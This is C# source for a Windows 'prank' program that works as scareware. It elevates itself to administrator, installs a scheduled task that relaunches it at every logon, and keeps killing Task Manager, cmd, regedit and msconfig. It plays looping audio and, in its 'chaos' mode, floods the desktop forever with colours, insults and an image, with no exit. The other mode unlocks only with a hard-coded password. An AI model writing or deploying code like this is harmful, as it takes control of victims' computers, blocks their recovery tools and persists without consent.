using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms; // 👈 Ajout WinForms
using Microsoft.Win32.TaskScheduler;
using NAudio.Wave;


class Program
{
    // API Windows
    [DllImport("user32.dll")]
    static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth,
        int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, CopyPixelOperation dwRop);

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;

    static string taskName = "NxTPrankTask";
    static string exePath = Process.GetCurrentProcess().MainModule.FileName;

    static Random random = new Random();

    static string[] messages = new string[]
    {
        "tiktok.com/@.0qzz",
        "NxT ON TOP",
        "You are an idiot"
    };

    static Image creepyImage;
    static string soundFilePath;

    static string stateFilePath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "nxtprank_state.txt"
    );

    enum PrankState
    {
        FirstRun,
        Chaos,
        Peaceful
    }

    static PrankState currentState = PrankState.FirstRun;

    static PasswordForm pwdForm;

    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        if (!IsRunAsAdmin())
        {
            RelaunchAsAdmin();
            return;
        }

        try
        {
            CreateTaskSchedulerEntry();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Erreur tâche planifiée: " + ex.Message);
        }

        LoadState();

        // Charger les assets
        string basePath = AppDomain.CurrentDomain.BaseDirectory;
        creepyImage = Image.FromFile(Path.Combine(basePath, "monster.gif"));
        soundFilePath = Path.Combine(basePath, "sound.mp3");

        // Tuer Task Manager, cmd, etc
        Thread killerThread = new Thread(KillSystemToolsLoop) { IsBackground = true };
        killerThread.Start();

        // Jouer son en boucle
        Thread audioThread = new Thread(() => PlayMp3Loop(soundFilePath)) { IsBackground = true };
        audioThread.Start();

        if (currentState == PrankState.FirstRun)
        {
            DialogResult dr = MessageBox.Show(
                "Can I use your PC ?",
                "NxT PRANK",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Question,
                MessageBoxDefaultButton.Button2);

            if (dr == DialogResult.Yes)
            {
                currentState = PrankState.Peaceful;
                SaveState(currentState);
                RunPeacefulMode();
            }
            else
            {
                currentState = PrankState.Chaos;
                SaveState(currentState);
                RunChaosMode();
            }
        }
        else if (currentState == PrankState.Chaos)
        {
            RunChaosMode();
        }
        else if (currentState == PrankState.Peaceful)
        {
            RunPeacefulMode();
        }
    }

    static void RunChaosMode()
    {
        while (true)
        {
            try
            {
                ChaosVisualEffects();
                Thread.Sleep(100);
            }
            catch { }
        }
    }

    static void RunPeacefulMode()
    {
        Thread appThread = new Thread(OpenAppsRandomly) { IsBackground = true };
        appThread.Start();

        pwdForm = new PasswordForm();
        Application.Run(pwdForm);

        if (pwdForm.PasswordValidated)
        {
            CleanupAndExit();
        }
        else
        {
            RunPeacefulMode();
        }
    }

    static void ChaosVisualEffects()
    {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        IntPtr desktopWnd = GetDesktopWindow();
        IntPtr desktopDC = GetWindowDC(desktopWnd);

        try
        {
            using (Graphics g = Graphics.FromHdc(desktopDC))
            {
                g.Clear(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)));

                g.TranslateTransform(width / 2, height / 2);
                g.RotateTransform(random.Next(-20, 20));
                g.TranslateTransform(-width / 2, -height / 2);

                foreach (var msg in messages)
                {
                    using (Font font = new Font("Comic Sans MS", 40, FontStyle.Bold))
                    using (Brush brush = new SolidBrush(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))))
                    {
                        g.DrawString(msg, font, brush, random.Next(width - 500), random.Next(height - 100));
                    }
                }

                g.DrawImage(creepyImage, random.Next(width - creepyImage.Width), random.Next(height - creepyImage.Height));
            }
        }
        finally
        {
            ReleaseDC(desktopWnd, desktopDC);
        }
    }

    static void OpenAppsRandomly()
    {
        string[] apps = { "notepad.exe", "calc.exe", "mspaint.exe", "write.exe" };
        while (true)
        {
            try
            {
                if (random.NextDouble() < 0.1)
                {
                    string app = apps[random.Next(apps.Length)];
                    Process.Start(app);
                }
            }
            catch { }

            Thread.Sleep(5000);
        }
    }

    static void LoadState()
    {
        if (File.Exists(stateFilePath))
        {
            string content = File.ReadAllText(stateFilePath).Trim();
            currentState = Enum.TryParse(content, out PrankState st) ? st : PrankState.FirstRun;
        }
    }

    static void SaveState(PrankState st)
    {
        File.WriteAllText(stateFilePath, st.ToString());
    }

    static bool IsRunAsAdmin()
    {
        var wi = WindowsIdentity.GetCurrent();
        var wp = new WindowsPrincipal(wi);
        return wp.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void RelaunchAsAdmin()
    {
        var psi = new ProcessStartInfo(exePath)
        {
            Verb = "runas",
            UseShellExecute = true
        };
        try { Process.Start(psi); } catch { }
        Environment.Exit(0);
    }

    static void CreateTaskSchedulerEntry()
    {
        using (TaskService ts = new TaskService())
        {
            var existing = ts.FindTask(taskName);
            if (existing != null) ts.RootFolder.DeleteTask(taskName);

            TaskDefinition td = ts.NewTask();
            td.RegistrationInfo.Description = "NxT Prank auto start";
            td.Triggers.Add(new LogonTrigger());
            td.Actions.Add(new ExecAction(exePath));
            td.Principal.RunLevel = TaskRunLevel.Highest;

            ts.RootFolder.RegisterTaskDefinition(taskName, td);
        }
    }

    static void CleanupAndExit()
    {
        using (TaskService ts = new TaskService())
        {
            var t = ts.FindTask(taskName);
            if (t != null) ts.RootFolder.DeleteTask(taskName);
        }

        if (File.Exists(stateFilePath)) File.Delete(stateFilePath);

        string batPath = Path.Combine(Path.GetTempPath(), "delself.bat");
        File.WriteAllText(batPath,
            $"@echo off\n" +
            $"timeout /t 2 /nobreak > nul\n" +
            $"del /f /q \"{exePath}\"\n" +
            $"del /f /q \"{batPath}\"");

        Process.Start(new ProcessStartInfo(batPath) { WindowStyle = ProcessWindowStyle.Hidden });

        Environment.Exit(0);
    }

    static void PlayMp3Loop(string path)
    {
        while (true)
        {
            try
            {
                using (var audioFile = new AudioFileReader(path))
                using (var outputDevice = new WaveOutEvent())
                {
                    outputDevice.Init(audioFile);
                    outputDevice.Play();
                    while (outputDevice.PlaybackState == PlaybackState.Playing)
                        Thread.Sleep(500);
                }
            }
            catch
            {
                Thread.Sleep(2000);
            }
        }
    }

    static void KillSystemToolsLoop()
    {
        while (true)
        {
            foreach (var name in new[] { "taskmgr", "cmd", "regedit", "msconfig" })
            {
                foreach (var proc in Process.GetProcessesByName(name))
                {
                    try { proc.Kill(); } catch { }
                }
            }
            Thread.Sleep(1000);
        }
    }
}

class PasswordForm : Form
{
    TextBox pwdBox = new TextBox();
    Button btn = new Button();
    public bool PasswordValidated = false;
    const string CorrectPwd = "Nathanmonhomme";

    public PasswordForm()
    {
        this.Text = "Unlock";
        this.Size = new Size(300, 100);
        this.TopMost = true;
        this.StartPosition = FormStartPosition.Manual;
        this.Location = new Point(Screen.PrimaryScreen.WorkingArea.Width - 310, 10);

        pwdBox.PasswordChar = '*';
        pwdBox.Dock = DockStyle.Top;

        btn.Text = "Unlock";
        btn.Dock = DockStyle.Bottom;
        btn.Click += Btn_Click;

        this.Controls.Add(pwdBox);
        this.Controls.Add(btn);
    }

    private void Btn_Click(object sender, EventArgs e)
    {
        if (pwdBox.Text == CorrectPwd)
        {
            PasswordValidated = true;
            MessageBox.Show("Prank désactivé !");
            this.Close();
        }
        else
        {
            MessageBox.Show("Mot de passe incorrect.");
        }
    }
}
